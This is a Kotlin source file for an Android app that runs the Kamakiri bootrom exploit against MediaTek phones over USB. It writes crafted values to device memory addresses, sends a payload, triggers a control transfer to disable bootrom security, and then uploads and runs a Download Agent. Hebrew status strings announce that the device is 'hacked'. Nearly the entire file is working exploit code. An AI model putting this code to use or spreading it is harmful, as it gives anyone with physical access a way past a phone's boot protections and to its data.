package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    fun runKamakiriAndSendDa(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        daBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) {
            connection.close()
            return "שגיאה: לא נמצאו נקודות קצה."
        }

        fun usbwrite(data: ByteArray): Boolean {
            return connection.bulkTransfer(epOut, data, data.size, 2000) >= 0
        }

        fun usbread(len: Int): ByteArray {
            val buf = ByteArray(len)
            connection.bulkTransfer(epIn, buf, len, 2000)
            return buf
        }

        fun echo(data: ByteArray): Boolean {
            if (!usbwrite(data)) return false
            val response = usbread(data.size)
            return response.contentEquals(data)
        }

        fun readDword(): Int {
            val bytes = usbread(4)
            if (bytes.size < 4) return -1
            return ByteBuffer.wrap(bytes).order(ByteOrder.BIG_ENDIAN).int
        }

        fun read32(addr: Int, dwords: Int): ByteArray {
            if (!echo(byteArrayOf(0xD1.toByte()))) return ByteArray(0)
            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())) return ByteArray(0)
            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(dwords).array())) return ByteArray(0)
            val status = readDword()
            if (status > 0xFF) return ByteArray(0)
            val data = usbread(dwords * 4)
            usbread(2)
            return data
        }

        fun write32(addr: Int, values: IntArray) {
            if (!echo(byteArrayOf(0xD4.toByte()))) return
            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())) return
            if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array())) return
            val status = readDword()
            if (status > 0xFF) return
            for (v in values) {
                echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array())
            }
        }

        onProgress("Starting Kamakiri exploit...")

        val addr = 0x10007050
        val revdwordPayloadAddr = 0x000A1000

        write32(addr, intArrayOf(revdwordPayloadAddr))
        for (i in 0 until 0xF) {
            read32(addr - (0xF - i) * 4, 0xF - i + 1)
        }

        onProgress("echo 0xE0...")
        if (!echo(byteArrayOf(0xE0.toByte()))) {
            connection.close()
            return "שגיאה: echo 0xE0 נכשל."
        }
        
        onProgress("send payload length...")
        if (!echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payloadBytes.size).array())) {
            connection.close()
            return "שגיאה: שליחת אורך Payload נכשלה."
        }

        onProgress("check status...")
        usbread(2)

        onProgress("Sending payload...")
        if (!usbwrite(payloadBytes)) {
            connection.close()
            return "שגיאה: שליחת Payload נכשלה."
        }

        onProgress("read ack...")
        usbread(2)
        usbread(2)

        onProgress("Triggering ctrl_transfer...")
        connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
        
        // --- Kamakiri done! Now sending DA ---
        onProgress("Kamakiri done! Sending DA...")
        
        // We don't close the connection. We send the DA immediately.
        // The BROM should now be patched and accept the DA.
        
        // Send 0xD7 (SEND_DA)
        if (!usbwrite(byteArrayOf(0xD7.toByte()))) {
            connection.close()
            return "Kamakiri עבד, אבל שליחת פקודת DA (0xD7) נכשלה."
        }
        
        // Read ACK 0xD8
        val ack1 = usbread(1)
        if (ack1.isEmpty() || ack1[0] != 0xD8.toByte()) {
            val hex = if(ack1.isNotEmpty()) String.format(Locale.US, "0x%02X", ack1[0]) else "אין"
            connection.close()
            return "Kamakiri עבד, אבל תגובה ל-0xD7 לא תקינה ($hex)."
        }

        // Send DA size (Little Endian)
        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
        if (!usbwrite(sizeBytes)) {
            connection.close()
            return "Kamakiri עבד, אבל שליחת גודל DA נכשלה."
        }

        // Read ACK 0xD9
        val ack2 = usbread(1)
        if (ack2.isEmpty() || ack2[0] != 0xD9.toByte()) {
            val hex = if(ack2.isNotEmpty()) String.format(Locale.US, "0x%02X", ack2[0]) else "אין"
            connection.close()
            return "Kamakiri עבד, אבל תגובה לגודל DA לא תקינה ($hex)."
        }

        // Send DA data
        var offset = 0
        val chunkSize = 512
        while (offset < daBytes.size) {
            val length = minOf(chunkSize, daBytes.size - offset)
            val chunk = daBytes.copyOfRange(offset, offset + length)
            
            if (!usbwrite(chunk)) {
                connection.close()
                return "שגיאה: שליחת נתוני DA נכשלה ב-$offset."
            }
            
            val ack = usbread(1)
            if (ack.isEmpty() || (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte())) {
                val hex = if(ack.isNotEmpty()) String.format(Locale.US, "0x%02X", ack[0]) else "אין"
                connection.close()
                return "שגיאה: תגובה לא תקינה לנתוני DA ב-$offset ($hex)."
            }
            
            offset += length
            if (offset % (chunkSize * 20) == 0) {
                onProgress("DA: ${(offset * 100) / daBytes.size}%")
            }
        }

        // Run DA (0xD5)
        onProgress("Running DA...")
        if (!usbwrite(byteArrayOf(0xD5.toByte()))) {
            connection.close()
            return "שגיאה: שליחת פקודת הרצה (0xD5) נכשלה."
        }
        
        usbread(2) // Read jump ack

        connection.close()
        return "הצלחה מסחררת!!! Kamakiri עבד וה-DA נטען. המכשיר פרוץ!"
    }
}
